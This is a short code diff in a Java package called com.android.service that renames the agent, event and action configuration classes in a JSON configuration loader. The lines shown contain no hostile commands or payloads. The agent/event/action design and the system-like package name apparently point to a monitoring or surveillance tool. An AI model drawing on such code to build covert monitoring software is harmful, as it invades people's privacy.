@@ -24,14 +24,11 @@ import com.android.service.GeneralException;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.action.Action;
-import com.android.service.action.ActionConf;
-import com.android.service.agent.AgentConf;
 
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.Crypto;
 import com.android.service.crypto.Encryption;
 import com.android.service.crypto.Keys;
-import com.android.service.event.EventConf;
 
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
@@ -168,7 +165,7 @@ public class Configuration {
 			}
 
 			if (instantiate) {
-				final AgentConf a = new AgentConf(moduleType, params);
+				final ConfAgent a = new ConfAgent(moduleType, params);
 				Status.self().addAgent(a);
 			}
 		}
@@ -190,7 +187,7 @@ public class Configuration {
 			}
 
 			if (instantiate) {
-				final EventConf e = new EventConf(eventId, eventType, jmodule);
+				final ConfEvent e = new ConfEvent(eventId, eventType, jmodule);
 				Status.self().addEvent(e);
 			}
 
@@ -218,7 +215,7 @@ public class Configuration {
 				JSONObject jsubaction = jsubactions.getJSONObject(j);
 
 				final String type = jsubaction.getString("action");
-				ActionConf conf = new ActionConf(actionId, j, type, jsubaction);
+				ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
 				if (a.addSubAction(conf)) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + jsubaction.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
